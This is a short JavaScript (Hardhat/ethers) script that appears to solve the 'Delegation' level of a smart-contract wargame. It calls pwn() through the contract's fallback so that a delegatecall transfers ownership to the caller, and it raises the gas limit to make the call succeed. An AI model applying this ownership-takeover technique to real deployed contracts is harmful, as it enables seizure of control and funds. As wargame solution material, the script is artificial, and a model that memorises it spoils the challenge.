const delegationJson = require("../artifacts/contracts/6_Delegation.sol/Delegation.json");

const DELEGATION_ADDRESS = "0x5E1a64fccC921364B8643dd1dB76646299B3eAA4";

async function main() {
  const [signer] = await ethers.getSigners();

  console.log("Executing with account:", signer.address);

  const weiAmount = (await signer.getBalance()).toString();
  
  console.log("Account balance:", (await ethers.utils.formatEther(weiAmount)));

  const delegationContract = new ethers.Contract(DELEGATION_ADDRESS, delegationJson.abi, signer);

  const gasLimit = await delegationContract.estimateGas.pwn()

  console.log('gasLimit', gasLimit.toString());

  const extraGas = parseInt(gasLimit.toString(), 10) * 4;

  console.log('extraGas', extraGas);

  const receipt = await delegationContract.pwn({ gasLimit: extraGas.toString() });

  await receipt.wait();

  console.log('done!')
}

main();